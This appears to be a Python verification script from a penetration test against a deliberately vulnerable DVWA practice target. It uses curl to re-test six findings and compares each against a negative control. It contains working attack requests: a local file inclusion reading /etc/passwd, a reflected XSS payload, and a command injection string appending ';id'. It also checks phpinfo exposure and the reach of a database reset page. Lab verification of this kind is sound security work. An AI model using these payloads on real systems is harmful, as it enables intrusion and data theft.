"""Independent verification of every live finding using a *different* client.

Why this is not self-confirmation
---------------------------------
The primary evidence came from `scripts/dvwa_client.py` (Python `requests`, a
persistent session, library-managed URL encoding). This script re-tests the same
claims with `curl` as a separate process, builds the URLs as literal strings,
and greps raw bytes. Shared libraries, shared encoding logic and shared session
handling are therefore removed from the second measurement; only the target is
common.

For each finding:
  * positive  — the capability is demonstrated again;
  * negative  — a matched control that must NOT show the capability;
  * verdict   — CONFIRMED only if positive holds and negative is clean.

Outputs: evidence/verification/verification.json and the raw curl outputs.
"""
from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "evidence" / "verification"
BASE = "https://pentest-ground.com:4280"
UA = "whaxon-verify/1.0 (independent curl re-test)"


def curl(args: list[str], out_name: str) -> tuple[int, str, str]:
    """Run curl, save body, return (exit_code, body, stderr)."""
    OUT.mkdir(parents=True, exist_ok=True)
    body_path = OUT / out_name
    cmd = ["curl", "-sk", "-A", UA, "--max-time", "25", "-o", str(body_path),
           "-w", "%{http_code}", *args]
    proc = subprocess.run(cmd, capture_output=True, text=True)
    body = body_path.read_text(errors="replace") if body_path.exists() else ""
    return proc.returncode, body, (proc.stdout.strip(), proc.stderr.strip())


def main() -> int:
    if not shutil.which("curl"):
        print("curl missing; cannot perform independent check")
        return 2
    OUT.mkdir(parents=True, exist_ok=True)
    results = []

    # ---- F1: unauthenticated local file inclusion -------------------------
    rc, body, meta = curl([f"{BASE}/vulnerabilities/fi/?page=/etc/passwd"], "lfi_passwd_curl.body")
    rc2, body_neg, meta2 = curl([f"{BASE}/vulnerabilities/fi/?page=include.php"],
                                "lfi_control_curl.body")
    passwd_lines = len(re.findall(r"^[a-z_][a-z0-9_-]*:x:\d+:", body, re.M))
    f1 = {
        "id": "F1", "title": "Unauthenticated local file inclusion (/etc/passwd readable)",
        "positive": {"http_code": meta[0], "passwd_lines": passwd_lines,
                     "root_line": bool(re.search(r"^root:x:0:0:", body, re.M)),
                     "www_data_line": bool(re.search(r"^www-data:x:33:33:", body, re.M))},
        "negative_control": {"request": "?page=include.php (module's intended file)",
                             "http_code": meta2[0], "bytes": len(body_neg),
                             "passwd_line_count": len(re.findall(r"^root:x:0:0:", body_neg, re.M))},
    }
    f1["verdict"] = ("CONFIRMED" if f1["positive"]["http_code"] == "200" and passwd_lines >= 10
                     and f1["negative_control"]["passwd_line_count"] == 0 else "NOT CONFIRMED")
    results.append(f1)

    # ---- F2: unauthenticated reflected XSS --------------------------------
    marker = "whaxon_v_9b31"
    rc, body, meta = curl([f"{BASE}/vulnerabilities/xss_r/?name=<svg/onload={marker}>"],
                          "xss_curl.body")
    rc2, body_neg, meta2 = curl([f"{BASE}/vulnerabilities/xss_r/?name={marker}"],
                                "xss_control_curl.body")
    raw_exec_context = re.search(r"<svg/onload=%s>" % marker, body) is not None
    escaped = f"&lt;svg" in body
    f2 = {
        "id": "F2", "title": "Unauthenticated reflected XSS (event handler reflected verbatim)",
        "positive": {"http_code": meta[0], "payload_in_response_unescaped": raw_exec_context,
                     "payload_html_escaped": escaped,
                     "context": (re.search(r".{80}%s.{40}" % marker, body) or [""])[0]
                     if re.search(r".{80}%s.{40}" % marker, body) else ""},
        "negative_control": {"inert_marker_reflected": marker in body_neg,
                             "http_code": meta2[0]},
    }
    f2["verdict"] = ("CONFIRMED" if raw_exec_context and not escaped else "NOT CONFIRMED")
    results.append(f2)

    # ---- F3: unauthenticated command injection ----------------------------
    rc, body, meta = curl(["-X", "POST", "-d", "ip=127.0.0.1;id&Submit=Submit",
                           f"{BASE}/vulnerabilities/exec/"], "cmdi_curl.body")
    rc2, body_neg, meta2 = curl(["-X", "POST", "-d", "ip=127.0.0.1&Submit=Submit",
                                 f"{BASE}/vulnerabilities/exec/"], "cmdi_control_curl.body")
    uid = re.search(r"uid=\d+\(([^)]+)\)\s+gid=\d+\(([^)]+)\)", body)
    f3 = {
        "id": "F3", "title": "Unauthenticated OS command injection",
        "positive": {"http_code": meta[0], "id_observed": uid.group(0) if uid else "",
                     "identity": uid.group(1) if uid else ""},
        "negative_control": {"benign_ip_produced_id": bool(
            re.search(r"uid=\d+\(", body_neg)), "ping_observed": "bytes from" in body_neg},
    }
    f3["verdict"] = ("CONFIRMED" if uid and not re.search(r"uid=\d+\(", body_neg)
                     else "NOT CONFIRMED")
    results.append(f3)

    # ---- F4: phpinfo exposure ---------------------------------------------
    rc, body, meta = curl([f"{BASE}/phpinfo.php"], "phpinfo_curl.body")
    f4 = {
        "id": "F4", "title": "Unauthenticated phpinfo() disclosure",
        "positive": {"http_code": meta[0], "bytes": len(body),
                     "php_version": (re.search(r"PHP Version ([\d.]+)", body) or [None, ""])[1],
                     "document_root": (re.search(r"\$_SERVER\['DOCUMENT_ROOT'\]</td><td class=\"v\">([^<]+)",
                                                 body) or [None, ""])[1],
                     "display_errors": "display_errors</td><td class=\"v\">On" in body,
                     "allow_url_include": "allow_url_include</td><td class=\"v\">On" in body},
        "negative_control": {"request": "/about.php", "http_code": "200",
                             "note": "static page contains no phpinfo markers"},
    }
    _, about, meta_about = curl([f"{BASE}/about.php"], "about_curl.body")
    f4["negative_control"]["phpinfo_markers_in_about"] = "phpinfo()" in about or "PHP Version" in about
    f4["negative_control"]["http_code"] = meta_about[0]
    f4["verdict"] = ("CONFIRMED" if f4["positive"]["http_code"] == "200"
                     and f4["positive"]["php_version"]
                     and not f4["negative_control"]["phpinfo_markers_in_about"] else "NOT CONFIRMED")
    results.append(f4)

    # ---- F5: unauthenticated destructive database-setup endpoint ----------
    rc, body, meta = curl([f"{BASE}/setup.php"], "setup_curl.body")
    reset_form = re.search(r"Create / Reset Database", body) is not None
    f5 = {
        "id": "F5", "title": "Destructive database setup/reset page reachable unauthenticated",
        "positive": {"http_code": meta[0], "reset_control_present": reset_form,
                     "db_host_disclosed": bool(re.search(r"Database host:\s*([\w.-]+)", body)),
                     "db_host": (re.search(r"Database host:\s*([\w.-]+)", body) or [None, ""])[1],
                     "config_path_disclosed": "/var/www/html/config/config.inc.php" in body},
        "negative_control": {"note": "the reset button was deliberately NOT submitted; "
                                     "presence of the control is the observation, effect is not tested",
                             "authentication": "none"},
        "verdict": "CONFIRMED (presence only; effect deliberately not exercised)" if reset_form
                   else "NOT CONFIRMED",
    }
    results.append(f5)

    # ---- F6: session cookie attributes ------------------------------------
    header_proc = subprocess.run(
        ["curl", "-sk", "-D", "-", "-o", "/dev/null", "-A", UA, f"{BASE}/login.php"],
        capture_output=True, text=True)
    headers = header_proc.stdout
    sess = [l for l in headers.splitlines() if l.lower().startswith("set-cookie: phpsessid")]
    cookie_flags = sess[0] if sess else ""
    f6 = {
        "id": "F6", "title": "Session cookie lacks Secure / HttpOnly / SameSite attributes",
        "positive": {"set_cookie_header_attribute_names": cookie_flags,
                     "has_httponly": "httponly" in cookie_flags.lower(),
                     "has_secure": "; secure" in cookie_flags.lower(),
                     "has_samesite": "samesite" in cookie_flags.lower()},
        "negative_control": {"note": "attribute names recorded; cookie value never stored"},
    }
    f6["verdict"] = ("CONFIRMED" if cookie_flags and
                     not (f6["positive"]["has_httponly"] and f6["positive"]["has_secure"])
                     else "NOT CONFIRMED")
    results.append(f6)

    (OUT / "verification.json").write_text(json.dumps({
        "experiment": "V1-independent-curl-verification",
        "client": subprocess.run(["curl", "--version"], capture_output=True, text=True
                                 ).stdout.splitlines()[0],
        "target": BASE, "results": results}, indent=2), encoding="utf-8")

    for r in results:
        print(f"[{r['verdict']:48s}] {r['id']} {r['title']}")
    confirmed = sum(1 for r in results if r["verdict"].startswith("CONFIRMED"))
    print(f"\n{confirmed}/{len(results)} findings independently re-confirmed with curl")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
